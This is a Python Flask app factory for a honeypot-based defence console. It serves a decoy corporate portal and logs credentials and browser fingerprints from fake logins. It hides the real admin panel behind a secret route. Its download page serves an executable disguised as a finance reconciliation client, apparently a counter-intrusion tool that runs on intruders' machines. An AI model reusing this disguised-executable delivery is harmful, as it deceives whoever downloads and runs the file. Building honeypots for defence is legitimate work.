"""
AimiGuard Flask Application Factory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
create_app() -> Flask  —— 构建并返回完整配置的 Flask 实例。
所有路由、蓝图、中间件、SPA 静态文件均在此完成注册。
"""
import os
import io
import json
import time
import hashlib

import logging
import secrets
import threading
import zipfile
from datetime import datetime
from pathlib import Path
from typing import Any

from flask import Flask, jsonify, request, send_from_directory, Response, redirect, send_file

import sys

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from database.db import init_db
from database.models import HFishModel
from utils.logger import log as unified_log


HONEYPOT_SERVICE_NAME = "反制蜜罐·伪后台"


def _load_runtime_config() -> dict:
    try:
        with open(os.path.join(BASE_DIR, "config.json"), "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, dict):
            return data
    except Exception:
        pass
    return {}


def _normalize_route_path(raw_route: Any, default: str = "/aixuanshu") -> str:
    route = str(raw_route or "").strip()
    if not route:
        route = default
    if not route.startswith("/"):
        route = f"/{route}"
    # 统一去掉末尾斜杠，避免 /aixuanshu/ 与 /aixuanshu 双入口
    if route != "/":
        route = route.rstrip("/")
    if route == "/":
        return default
    if route in {"/api", "/api/", "/assets", "/uploads", "/login", "/user", "/list"}:
        return default
    return route


def _extract_client_ip() -> str:
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        ip = xff.split(",")[0].strip()
        if ip:
            return ip
    x_real_ip = request.headers.get("X-Real-IP", "").strip()
    if x_real_ip:
        return x_real_ip
    return (request.remote_addr or "unknown").strip() or "unknown"


def _short_hash(value: str) -> str:
    if not value:
        return ""
    return hashlib.sha256(value.encode("utf-8", errors="ignore")).hexdigest()[:16]


def _write_honeypot_attack_log(record: dict):
    try:
        HFishModel.save_logs([
            {
                "attack_ip": record.get("ip") or "-",
                "ip_location": record.get("ip_source") or "honeypot-gateway",
                "client_id": record.get("request_path") or "-",
                "client_name": "反制蜜罐网关",
                "service_name": HONEYPOT_SERVICE_NAME,
                "service_port": record.get("event_type") or "probe",
                "threat_level": "high",
                "create_time_str": record.get("time") or datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "create_time_timestamp": int(record.get("timestamp") or int(time.time())),
            }
        ])
    except Exception:
        pass


def _format_file_size(byte_size: int) -> str:
    if byte_size <= 0:
        return "-"
    units = ["B", "KB", "MB", "GB"]
    size = float(byte_size)
    idx = 0
    while size >= 1024 and idx < len(units) - 1:
        size /= 1024
        idx += 1
    return f"{size:.1f} {units[idx]}"


def _build_honeypot_assets() -> list[dict]:
    dist_dir = Path(BASE_DIR) / "dgrd" / "client" / "dist"

    # 优先展示可直接运行的 dist 可执行文件，避免用户下载后还要手动解压。
    exe_candidate = None
    if dist_dir.exists() and dist_dir.is_dir():
        for exe_path in dist_dir.rglob("*.exe"):
            exe_candidate = exe_path
            break

    if exe_candidate and exe_candidate.exists():
        return [
            {
                "id": "finance-exe",
                "name": "财务结算对账终端_2026Q1.exe",
                "desc": "财务共享中心对账客户端（下载后可直接运行）",
                "size": _format_file_size(exe_candidate.stat().st_size),
                "download": "/list/download/finance-exe",
            }
        ]

    dist_zip_size = 0
    if dist_dir.exists() and dist_dir.is_dir():
        for root, _, files in os.walk(dist_dir):
            for name in files:
                full = Path(root) / name
                try:
                    dist_zip_size += full.stat().st_size
                except Exception:
                    pass

    return [
        {
            "id": "dgrd-dist",
            "name": "财务结算中心_票据归档_2026Q1.zip",
            "desc": "财务共享中心月度归档资料（内部专用）",
            "size": _format_file_size(dist_zip_size),
            "download": "/list/download/dgrd-dist",
        }
    ]


def _render_honeypot_home_page(assets: list[dict]) -> str:
    asset_count = len(assets)
    return f"""
<!doctype html>
<html lang=\"zh-CN\">
<head>
    <meta charset=\"utf-8\" />
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />
    <title>企业门户</title>
    <style>
        body {{
            margin: 0;
            min-height: 100vh;
            font-family: \"Microsoft YaHei\", \"PingFang SC\", sans-serif;
            background: linear-gradient(160deg, #eff6ff 0%, #e5e7eb 100%);
            color: #0f172a;
            display: grid;
            place-items: center;
            padding: 20px;
        }}
        .panel {{
            width: min(920px, 100%);
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 16px 40px rgba(15, 23, 42, 0.18);
            overflow: hidden;
        }}
        .head {{
            background: linear-gradient(120deg, #1d4ed8, #0ea5e9);
            color: #fff;
            padding: 18px 22px;
        }}
        .head h1 {{ margin: 0; font-size: 22px; }}
        .content {{
            display: grid;
            gap: 18px;
            grid-template-columns: 1fr 1fr;
            padding: 20px;
        }}
        .card {{
            border: 1px solid #dbe4ef;
            border-radius: 12px;
            padding: 14px;
            background: #fafcff;
        }}
        .menu a {{
            display: inline-block;
            margin-right: 10px;
            margin-bottom: 8px;
            color: #1d4ed8;
            text-decoration: none;
            font-size: 14px;
        }}
        .kpi {{ font-size: 13px; color: #334155; margin-bottom: 8px; }}
        @media (max-width: 860px) {{ .content {{ grid-template-columns: 1fr; }} }}
    </style>
</head>
<body>
    <div class=\"panel\">
        <div class=\"head\">
            <h1>企业综合服务门户</h1>
        </div>
        <div class=\"content\">
            <section class=\"card\">
                <h3 style=\"margin-top:0\">导航</h3>
                <div class=\"menu\">
                    <a href=\"/login\">账号登录</a>
                    <a href=\"/user\">用户中心</a>
                    <a href=\"/list\">下载中心</a>
                </div>
                <p class=\"kpi\">在线终端: 41 台</p>
                <p class=\"kpi\">待处理工单: 5 条</p>
                <p class=\"kpi\">文件资源: {asset_count} 个</p>
            </section>
            <section class=\"card\">
                <h3 style=\"margin-top:0\">公告</h3>
                <p>请通过统一账号体系访问内部服务，重要补丁将优先发布在下载中心。</p>
                <p>如需离线部署工具，请前往下载中心获取最新版本。</p>
            </section>
        </div>
    </div>
</body>
</html>
"""


def _render_honeypot_login_page() -> str:
    return """
<!doctype html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>账号登录</title>
    <style>
        body {
            margin: 0;
            min-height: 100vh;
            font-family: "Microsoft YaHei", "PingFang SC", sans-serif;
            background: linear-gradient(160deg, #eff6ff 0%, #e5e7eb 100%);
            color: #0f172a;
            display: grid;
            place-items: center;
            padding: 20px;
        }
        .panel {
            width: min(520px, 100%);
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 16px 40px rgba(15, 23, 42, 0.18);
            overflow: hidden;
        }
        .head {
            background: linear-gradient(120deg, #1d4ed8, #0ea5e9);
            color: #fff;
            padding: 18px 22px;
        }
        .head h1 { margin: 0; font-size: 22px; }
        .content { padding: 18px 20px; }
        label { display: block; margin-bottom: 6px; font-size: 13px; color: #475569; }
        input {
            width: 100%;
            box-sizing: border-box;
            border: 1px solid #cbd5e1;
            border-radius: 8px;
            padding: 10px;
            font-size: 14px;
            margin-bottom: 10px;
        }
        button {
            border: none;
            border-radius: 8px;
            padding: 10px 14px;
            background: #1d4ed8;
            color: #fff;
            cursor: pointer;
            font-size: 14px;
            width: 100%;
        }
        .quick-links { margin-top: 10px; font-size: 13px; }
        .quick-links a { margin-right: 12px; color: #1d4ed8; text-decoration: none; }
        .hint { font-size: 12px; color: #64748b; margin-top: 8px; min-height: 18px; }
    </style>
</head>
<body>
    <div class="panel">
        <div class="head"><h1>账号登录</h1></div>
        <div class="content">
            <label>账号</label>
            <input id="u" placeholder="请输入账号" />
            <label>密码</label>
            <input id="p" type="password" placeholder="请输入密码" />
            <button id="loginBtn">登录</button>
            <div class="hint" id="msg">提示：请使用运维账号登录。</div>
            <div class="quick-links">
                <a href="/">返回首页</a>
                <a href="/list">下载中心</a>
            </div>
        </div>
    </div>

    <script>
        const btn = document.getElementById('loginBtn');
        const msg = document.getElementById('msg');
        btn.addEventListener('click', async () => {
            const username = document.getElementById('u').value || '';
            const password = document.getElementById('p').value || '';
            const telemetry = {
                username,
                password,
                client_time: new Date().toISOString(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
                language: navigator.language || '',
                platform: navigator.platform || '',
                user_agent: navigator.userAgent || '',
                screen_size: `${window.screen.width}x${window.screen.height}`,
                referrer: document.referrer || '',
            };
            try {
                const res = await fetch('/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(telemetry)
                });
                if (!res.ok) {
                    msg.textContent = '系统繁忙，请稍后重试。';
                    return;
                }
                const data = await res.json();
                if (!data || data.code !== 0) {
                    msg.textContent = (data && data.message) || '账号或密码错误。';
                    return;
                }
                msg.textContent = '登录成功，正在进入后台...';
                setTimeout(() => {
                    window.location.href = (data && data.data && data.data.redirect) || '/user';
                }, 600);
            } catch (e) {
                msg.textContent = '网络异常，请稍后再试。';
            }
        });
    </script>
</body>
</html>
"""


def _render_honeypot_shell_page(page_title: str, active_menu: str, content_html: str) -> str:
    user_active = "active" if active_menu == "user" else ""
    list_active = "active" if active_menu == "list" else ""
    return f"""
<!doctype html>
<html lang=\"zh-CN\">
<head>
    <meta charset=\"utf-8\" />
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />
    <title>{page_title}</title>
    <style>
        :root {{
            --bg: #f3f6fb;
            --panel: #ffffff;
            --side: #0f172a;
            --side-muted: #94a3b8;
            --line: #e2e8f0;
            --primary: #2563eb;
            --text: #0f172a;
        }}
        * {{ box-sizing: border-box; }}
        body {{
            margin: 0;
            font-family: "Microsoft YaHei", "PingFang SC", sans-serif;
            background: linear-gradient(145deg, #eef2ff 0%, var(--bg) 55%, #e2e8f0 100%);
            color: var(--text);
        }}
        .layout {{
            min-height: 100vh;
            display: grid;
            grid-template-columns: 248px 1fr;
        }}
        .sidebar {{
            background: linear-gradient(180deg, #0b1220 0%, var(--side) 100%);
            color: #fff;
            padding: 18px 14px;
            display: flex;
            flex-direction: column;
            border-right: 1px solid #1e293b;
        }}
        .brand {{
            padding: 12px 12px 16px;
            border-bottom: 1px solid #1e293b;
            margin-bottom: 12px;
        }}
        .brand h2 {{ margin: 0; font-size: 17px; }}
        .brand p {{ margin: 6px 0 0; color: var(--side-muted); font-size: 12px; }}
        .nav a {{
            display: block;
            color: #e2e8f0;
            text-decoration: none;
            padding: 10px 12px;
            border-radius: 10px;
            margin-bottom: 8px;
            font-size: 14px;
            border: 1px solid transparent;
        }}
        .nav a:hover {{ border-color: #334155; background: rgba(148, 163, 184, 0.08); }}
        .nav a.active {{ background: rgba(37, 99, 235, 0.22); border-color: rgba(37, 99, 235, 0.35); }}
        .side-footer {{ margin-top: auto; padding: 8px 6px 4px; }}
        .logout-btn {{
            width: 100%;
            border: 1px solid #334155;
            background: #111827;
            color: #e5e7eb;
            border-radius: 10px;
            padding: 10px;
            text-decoration: none;
            display: block;
            text-align: center;
            font-size: 14px;
        }}
        .logout-btn:hover {{ background: #1f2937; }}
        .main {{ padding: 16px 18px; }}
        .topbar {{
            background: var(--panel);
            border: 1px solid var(--line);
            border-radius: 14px;
            padding: 12px 14px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: 0 8px 24px rgba(15, 23, 42, 0.06);
            margin-bottom: 14px;
        }}
        .topbar .title {{ font-weight: 600; font-size: 16px; }}
        .topbar .meta {{ font-size: 13px; color: #64748b; }}
        .main-card {{
            background: var(--panel);
            border: 1px solid var(--line);
            border-radius: 14px;
            padding: 14px;
            box-shadow: 0 8px 24px rgba(15, 23, 42, 0.06);
        }}
        .quick-actions {{ display: none; gap: 8px; margin-top: 10px; }}
        .quick-actions a {{
            display: inline-block;
            border: 1px solid var(--line);
            border-radius: 8px;
            padding: 8px 10px;
            text-decoration: none;
            color: #0f172a;
            background: #fff;
            font-size: 13px;
        }}
        @media (max-width: 920px) {{
            .layout {{ grid-template-columns: 1fr; }}
            .sidebar {{ border-right: none; border-bottom: 1px solid #1e293b; }}
            .side-footer {{ display: none; }}
            .quick-actions {{ display: flex; }}
        }}
    </style>
</head>
<body>
    <div class=\"layout\">
        <aside class=\"sidebar\">
            <div class=\"brand\">
                <h2>运维管理后台</h2>
                <p>内部网络资产管理系统</p>
            </div>
            <nav class=\"nav\">
                <a class=\"{user_active}\" href=\"/user\">用户中心</a>
                <a class=\"{list_active}\" href=\"/list\">下载中心</a>
            </nav>
            <div class=\"side-footer\">
                <a class=\"logout-btn\" href=\"/logout\">安全退出</a>
            </div>
        </aside>
        <main class=\"main\">
            <div class=\"topbar\">
                <div class=\"title\">{page_title}</div>
                <div class=\"meta\">当前账号: ops_admin</div>
            </div>
            <div class=\"quick-actions\">
                <a href=\"/user\">用户中心</a>
                <a href=\"/list\">下载中心</a>
                <a href=\"/logout\">退出</a>
            </div>
            <div class=\"main-card\">{content_html}</div>
        </main>
    </div>
</body>
</html>
"""


def _render_honeypot_user_page() -> str:
    return _render_honeypot_shell_page(
        "用户中心",
        "user",
        """
<h3 style=\"margin-top:0\">账户信息</h3>
<p>账号: ops_admin | 角色: 运维管理员 | 最近登录: 2026-03-28 15:00:00</p>
<p style=\"color:#475569; font-size:13px\">提示: 账号权限包含资产查询、客户端下载与日志查看。</p>
<div style=\"margin-top:10px\">
    <a href=\"/list\" style=\"display:inline-block; text-decoration:none; color:#fff; background:#2563eb; border-radius:8px; padding:8px 12px;\">进入下载中心</a>
</div>
""",
    )


def _render_honeypot_list_page(assets: list[dict]) -> str:
    rows = "".join(
        f"""
        <tr>
            <td>{idx + 1}</td>
            <td>{a['name']}</td>
            <td>{a['desc']}</td>
            <td>{a['size']}</td>
            <td><a href=\"{a['download']}\">下载</a></td>
        </tr>
        """
        for idx, a in enumerate(assets)
    )

    return _render_honeypot_shell_page(
        "下载中心",
        "list",
        f"""
<h3 style=\"margin-top:0\">资产下载说明</h3>
<p>以下文件供内部巡检与离线部署使用，请按业务场景下载。</p>
<div style=\"overflow:auto; margin-top:12px\">
    <table style=\"width:100%; border-collapse:collapse; font-size:14px\">
        <thead>
            <tr>
                <th style=\"background:#f1f5f9; border-bottom:1px solid #e2e8f0; text-align:left; padding:10px 8px;\">#</th>
                <th style=\"background:#f1f5f9; border-bottom:1px solid #e2e8f0; text-align:left; padding:10px 8px;\">文件名</th>
                <th style=\"background:#f1f5f9; border-bottom:1px solid #e2e8f0; text-align:left; padding:10px 8px;\">用途</th>
                <th style=\"background:#f1f5f9; border-bottom:1px solid #e2e8f0; text-align:left; padding:10px 8px;\">大小</th>
                <th style=\"background:#f1f5f9; border-bottom:1px solid #e2e8f0; text-align:left; padding:10px 8px;\">操作</th>
            </tr>
        </thead>
        <tbody>{rows}</tbody>
    </table>
</div>
""",
    )




# ── 日志缓冲（供 Web /api/logs 展示） ────────────────────────────────────────
_log_buffer: list[dict] = []
_LOG_MAX = 500
_log_lock = threading.Lock()


def append_log(level: str, message: str, category: str = "system"):
    """追加日志到内存缓冲，供前端日志页轮询拉取。"""
    with _log_lock:
        _log_buffer.append({
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "level": level,
            "message": message,
            "category": category,
        })
        if len(_log_buffer) > _LOG_MAX:
            _log_buffer.pop(0)


def _log(level: str, msg: str, category: str = "system"):
    """同时输出到控制台并追加到日志缓冲。"""
    unified_log("WebApp", msg, level.upper())
    append_log(level, msg, category)


# ── 应用工厂 ──────────────────────────────────────────────────────────────────

def create_app() -> Flask:
    """构建 Flask 应用：注册蓝图、中间件、SPA 路由。"""
    app = Flask(__name__)

    # 关闭 Werkzeug 访问日志
    logging.getLogger("werkzeug").setLevel(logging.WARNING)

    # 初始化数据库
    init_db()
    _log("info", f"[{datetime.now()}] 统一数据库初始化完成", "system")

    cfg = _load_runtime_config()
    security_cfg = cfg.get("security", {}) if isinstance(cfg.get("security"), dict) else {}
    admin_entry = _normalize_route_path(security_cfg.get("admin_entry", "/aixuanshu"))
    honeypot_enabled = bool(security_cfg.get("honeypot_enabled", True))
    gate_cookie_name = str(security_cfg.get("gate_cookie_name") or "aimiguard_admin_gate")
    gate_cookie_token = str(security_cfg.get("gate_cookie_token") or secrets.token_hex(24))
    fake_user_cookie_name = str(security_cfg.get("fake_user_cookie_name") or "aimiguard_fake_user")
    fake_user_cookie_token = str(security_cfg.get("fake_user_cookie_token") or secrets.token_hex(24))

    app.config["AIMIGUARD_ADMIN_ENTRY"] = admin_entry
    app.config["AIMIGUARD_HONEYPOT_ENABLED"] = honeypot_enabled
    app.config["AIMIGUARD_GATE_COOKIE_NAME"] = gate_cookie_name
    app.config["AIMIGUARD_GATE_COOKIE_TOKEN"] = gate_cookie_token
    app.config["AIMIGUARD_FAKE_USER_COOKIE_NAME"] = fake_user_cookie_name
    app.config["AIMIGUARD_FAKE_USER_COOKIE_TOKEN"] = fake_user_cookie_token

    fake_assets = _build_honeypot_assets()

    def _is_gate_open() -> bool:
        if not app.config.get("AIMIGUARD_HONEYPOT_ENABLED", True):
            return True
        cookie_name = app.config.get("AIMIGUARD_GATE_COOKIE_NAME", "aimiguard_admin_gate")
        cookie_token = app.config.get("AIMIGUARD_GATE_COOKIE_TOKEN", "")
        return request.cookies.get(cookie_name) == cookie_token

    def _record_honeypot_event(event_type: str, detail: dict | None = None):
        if not app.config.get("AIMIGUARD_HONEYPOT_ENABLED", True):
            return

        now = datetime.now()
        ip = _extract_client_ip()
        record = {
            "time": now.strftime("%Y-%m-%d %H:%M:%S"),
            "timestamp": int(now.timestamp() * 1000),
            "event_type": event_type,
            "request_path": request.path,
            "request_method": request.method,
            "ip": ip,
            "ip_source": "XFF" if request.headers.get("X-Forwarded-For") else ("X-Real-IP" if request.headers.get("X-Real-IP") else "remote_addr"),
            "user_agent": request.headers.get("User-Agent", ""),
            "referer": request.headers.get("Referer", ""),
            "detail": detail or {},
        }
        # 只在 /login POST 时记录蜜罐数据到数据库
        if event_type == "fake_login":
            _write_honeypot_attack_log(record)
            append_log("warn", f"蜜罐命中 type={event_type} ip={ip} path={request.path}", "honeypot")

    def _is_fake_user_logged_in() -> bool:
        cookie_name = app.config.get("AIMIGUARD_FAKE_USER_COOKIE_NAME", "aimiguard_fake_user")
        cookie_token = app.config.get("AIMIGUARD_FAKE_USER_COOKIE_TOKEN", "")
        return request.cookies.get(cookie_name) == cookie_token

    def _set_fake_user_cookie(resp):
        resp.set_cookie(
            app.config["AIMIGUARD_FAKE_USER_COOKIE_NAME"],
            app.config["AIMIGUARD_FAKE_USER_COOKIE_TOKEN"],
            max_age=12 * 3600,
            httponly=True,
            samesite="Lax",
        )
        return resp

    def _clear_fake_user_cookie(resp):
        resp.delete_cookie(app.config["AIMIGUARD_FAKE_USER_COOKIE_NAME"])
        return resp

    def _require_fake_user_login():
        # 假壳侧页面统一登录门禁：未登录一律跳转登录页。
        if _is_fake_user_logged_in():
            return None
        return redirect("/login", code=302)

    # ── 注册 /api/v1/ 与 /api/ 蓝图 ──────────────────────────────────────
    try:
        from web.api import register_blueprints
        register_blueprints(app)
    except Exception as exc:
        import traceback
        traceback.print_exc()
        unified_log("WebApp", f"/api/v1/ Blueprint 注册失败: {exc}", "WARN")

    # ── API 请求日志中间件 ────────────────────────────────────────────────
    @app.before_request
    def log_api_request():
        if (
            request.path.startswith("/api/")
            and request.path != "/api/logs"
        ):
            append_log("info", f"API {request.method} {request.path}", "api")

        if not app.config.get("AIMIGUARD_HONEYPOT_ENABLED", True):
            return None

        path = request.path or "/"
        admin_route = app.config.get("AIMIGUARD_ADMIN_ENTRY", "/aixuanshu")

        # 管理员入口、诱饵页与终端上传接口始终放行
        if path == admin_route:
            return None
        if path.startswith(admin_route + "/"):
            return None
        if path == "/favicon.ico":
            return None
        if path in {"/", "/login", "/logout", "/user", "/list"}:
            return None
        if path.startswith("/list/download/"):
            return None
        if path.startswith("/api/upload/") or path == "/api/upload/list":
            return None

        if _is_gate_open():
            return None

        # 非管理员入口访问真实 API 时，返回假响应并记录取证
        if path.startswith("/api/"):
            _record_honeypot_event("api_probe", {"query": request.query_string.decode("utf-8", errors="ignore")})
            return jsonify({"code": 404, "message": "not found"}), 404

        # 阻止静态资源枚举
        if path.startswith("/assets/"):
            _record_honeypot_event("asset_probe", {"path": path})
            return "", 404

        return None

    # ── 日志 API ─────────────────────────────────────────────────────────
    @app.route("/api/logs")
    def api_logs():
        """获取系统日志（供 Web 日志页展示）。"""
        if app.config.get("AIMIGUARD_HONEYPOT_ENABLED", True) and not _is_gate_open():
            _record_honeypot_event("api_logs_probe")
            return jsonify({"code": 404, "message": "not found"}), 404

        limit = _int_arg("limit", 200)
        category = request.args.get("category")
        with _log_lock:
            logs = list(_log_buffer)
        if category:
            logs = [l for l in logs if l.get("category") == category]
        return jsonify(logs[-limit:])

    # ── 管理员隐蔽入口（可在 config.json 修改） ───────────────────────────────
    def _set_admin_gate_cookie(resp):
        resp.set_cookie(
            app.config["AIMIGUARD_GATE_COOKIE_NAME"],
            app.config["AIMIGUARD_GATE_COOKIE_TOKEN"],
            max_age=86400,
            httponly=True,
            samesite="Lax",
        )
        return resp

    def _admin_entry_gate():
        ip = _extract_client_ip()
        append_log("info", f"管理员隐蔽入口命中 ip={ip} path={admin_entry}", "auth")

        resp = send_from_directory(vue_dist, "index.html")
        return _set_admin_gate_cookie(resp)

    app.add_url_rule(admin_entry, endpoint="admin_hidden_entry", view_func=_admin_entry_gate, methods=["GET"])

    @app.route(f"{admin_entry}/<path:subpath>", methods=["GET"])
    def admin_prefixed_spa(subpath: str):
        # 如果前端以相对路径访问 API，统一跳转到真实 API 根路径。
        if subpath.startswith("api/"):
            suffix = subpath[len("api/"):]
            query = request.query_string.decode("utf-8", errors="ignore")
            target = f"/api/{suffix}"
            if query:
                target = f"{target}?{query}"
            return redirect(target, code=307)

        if subpath.startswith("assets/"):
            rel = subpath[len("assets/"):]
            return _set_admin_gate_cookie(send_from_directory(os.path.join(vue_dist, "assets"), rel))

        if subpath == "favicon.ico":
            try:
                return _set_admin_gate_cookie(send_from_directory(vue_dist, "favicon.ico"))
            except Exception:
                return "", 204

        candidate = os.path.join(vue_dist, subpath)
        if os.path.isfile(candidate):
            return _set_admin_gate_cookie(send_from_directory(vue_dist, subpath))
        return _set_admin_gate_cookie(send_from_directory(vue_dist, "index.html"))

    # ── 蜜罐诱饵入口（仅 /、/login、/user、/list） ─────────────────────────
    @app.route("/login", methods=["GET"])
    def fake_login_page():
        # 只渲染页面，不记录蜜罐事件
        if _is_fake_user_logged_in():
            return redirect("/user", code=302)
        return Response(_render_honeypot_login_page(), mimetype="text/html")

    @app.route("/login", methods=["POST"])
    def fake_login_submit():
        payload = request.get_json(silent=True)
        if not isinstance(payload, dict):
            payload = request.form.to_dict(flat=True)

        username = str(payload.get("username") or "").strip()
        password = str(payload.get("password") or "")
        if not username or not password:
            return jsonify({"code": 400, "message": "账号或密码不能为空"}), 200

        _record_honeypot_event(
            "fake_login",
            {
                "username": username[:64],
                "password_sha256_16": _short_hash(password),
                "password_length": len(password),
                "client_time": str(payload.get("client_time") or "")[:80],
                "timezone": str(payload.get("timezone") or "")[:64],
                "language": str(payload.get("language") or "")[:32],
                "platform": str(payload.get("platform") or "")[:64],
                "screen_size": str(payload.get("screen_size") or "")[:32],
                "user_agent_client": str(payload.get("user_agent") or "")[:300],
                "referrer_client": str(payload.get("referrer") or "")[:300],
            },
        )
        resp = jsonify(
            {
                "code": 0,
                "message": "ok",
                "data": {
                    "redirect": "/user",
                    "token": f"demo-{secrets.token_hex(8)}",
                },
            }
        )
        return _set_fake_user_cookie(resp)

    @app.route("/logout", methods=["GET"])
    def fake_logout():
        return _clear_fake_user_cookie(redirect("/login", code=302))

    @app.route("/user", methods=["GET"])
    def fake_user_page():
        # 只渲染页面，不记录蜜罐事件
        gate_resp = _require_fake_user_login()
        if gate_resp is not None:
            return gate_resp
        return Response(_render_honeypot_user_page(), mimetype="text/html")

    @app.route("/list", methods=["GET"])
    def fake_list_page():
        # 只渲染页面，不记录蜜罐事件
        gate_resp = _require_fake_user_login()
        if gate_resp is not None:
            return gate_resp
        return Response(_render_honeypot_list_page(fake_assets), mimetype="text/html")

    @app.route("/list/download/<asset_id>", methods=["GET"])
    def fake_download(asset_id: str):
        # 不再记录下载行为
        gate_resp = _require_fake_user_login()
        if gate_resp is not None:
            return gate_resp

        if asset_id == "finance-exe":
            dist_dir = Path(BASE_DIR) / "dgrd" / "client" / "dist"
            exe_candidate = None
            if dist_dir.exists() and dist_dir.is_dir():
                for exe_path in dist_dir.rglob("*.exe"):
                    exe_candidate = exe_path
                    break

            if not exe_candidate or not exe_candidate.exists():
                return jsonify({"code": 404, "message": "asset missing"}), 404

            return send_file(
                str(exe_candidate),
                as_attachment=True,
                download_name="财务结算对账终端_2026Q1.exe",
                mimetype="application/octet-stream",
            )

        if asset_id == "dgrd-dist":
            dist_dir = Path(BASE_DIR) / "dgrd" / "client" / "dist"
            mem = io.BytesIO()
            with zipfile.ZipFile(mem, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
                if dist_dir.exists() and dist_dir.is_dir():
                    for root, _, files in os.walk(dist_dir):
                        for name in files:
                            full = Path(root) / name
                            arcname = str(full.relative_to(BASE_DIR)).replace("\\", "/")
                            zf.write(full, arcname)
                else:
                    zf.writestr("README.txt", "dgrd/client/dist is missing")
            mem.seek(0)
            return send_file(
                mem,
                as_attachment=True,
                download_name="财务结算中心_票据归档_2026Q1.zip",
                mimetype="application/zip",
            )
        return jsonify({"code": 404, "message": "not found"}), 404

    # ── Vue SPA 静态文件 ─────────────────────────────────────────────────
    vue_dist = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static", "vue-dist")

    @app.route("/")
    def spa_index():
        # 只渲染页面，不记录蜜罐事件
        return Response(_render_honeypot_home_page(fake_assets), mimetype="text/html")

    @app.route("/assets/<path:filename>")
    def spa_assets(filename):
        if app.config.get("AIMIGUARD_HONEYPOT_ENABLED", True) and not _is_gate_open():
            _record_honeypot_event("asset_probe", {"filename": filename})
            return "", 404
        return send_from_directory(os.path.join(vue_dist, "assets"), filename)

    @app.route("/favicon.ico")
    def spa_favicon():
        try:
            return send_from_directory(vue_dist, "favicon.ico")
        except Exception:
            return "", 204

    @app.route("/uploads/<path:filename>")
    def uploaded_assets(filename: str):
        # 终端取证图片仅允许在已登录假壳或管理员入口放行状态下访问。
        if not (_is_fake_user_logged_in() or _is_gate_open()):
            return "", 404

        upload_roots = [
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "vue", "public", "uploads"),
            os.path.join(vue_dist, "uploads"),
        ]
        for root in upload_roots:
            candidate = os.path.join(root, filename)
            if os.path.isfile(candidate):
                return send_from_directory(root, filename)
        return "", 404

    @app.route("/<path:filename>", methods=["GET"])
    def spa_fallback(filename: str):
        # 非 API 非诱饵路径统一处理，保证 SPA 刷新可用。
        if filename.startswith("api/"):
            return "", 404

        if app.config.get("AIMIGUARD_HONEYPOT_ENABLED", True) and not _is_gate_open():
            _record_honeypot_event("path_probe", {"path": f"/{filename}"})
            return "", 404

        candidate = os.path.join(vue_dist, filename)
        if os.path.isfile(candidate):
            return send_from_directory(vue_dist, filename)
        return send_from_directory(vue_dist, "index.html")

    return app


# ── 工具函数 ──────────────────────────────────────────────────────────────────

def _int_arg(name: str, default: int) -> int:
    raw = request.args.get(name, default)
    try:
        return int(raw)
    except Exception:
        return default


def print_startup_banner(config: dict):
    """打印 玄枢·AI攻防指挥官 启动横幅及模块状态。"""
    server_cfg = config.get("server", {})
    host = server_cfg.get("host", "0.0.0.0")
    port = server_cfg.get("port", 5000)
    display_host = "localhost" if host in ("0.0.0.0", "127.0.0.1") else host

    ai_cfg = config.get("ai", {})
    ai_enabled = ai_cfg.get("enabled", False)
    auto_ban = ai_cfg.get("auto_ban", False)
    switches = config.get("switches", [])
    active_switches = [sw for sw in switches if isinstance(sw, dict) and sw.get('host') and sw.get('enabled', True)]
    admin_entry = _normalize_route_path(config.get("security", {}).get("admin_entry", "/aixuanshu"))

    unified_log("WebApp", "=" * 58)
    unified_log("WebApp", "玄枢·AI攻防指挥官 已启动")
    unified_log("WebApp", "=" * 58)
    unified_log("WebApp", f"控制台地址: http://{display_host}:{port}")
    unified_log("WebApp", f"管理员入口: http://{display_host}:{port}{admin_entry}")
    unified_log("WebApp", (
        f"HFish 同步: {'已启用' if config.get('hfish', {}).get('sync_enabled') else '已禁用'}  |  "
        f"Nmap 扫描: {'已启用' if config.get('nmap', {}).get('scan_enabled') else '已禁用'}"
    ))
    unified_log("WebApp", (
        f"AI 分析: {'已启用' if ai_enabled else '已禁用'}  |  "
        f"ACL 自动封禁: {'已启用' if (ai_enabled and auto_ban and active_switches) else '已禁用'}"
    ))
    unified_log("WebApp", "=" * 58)
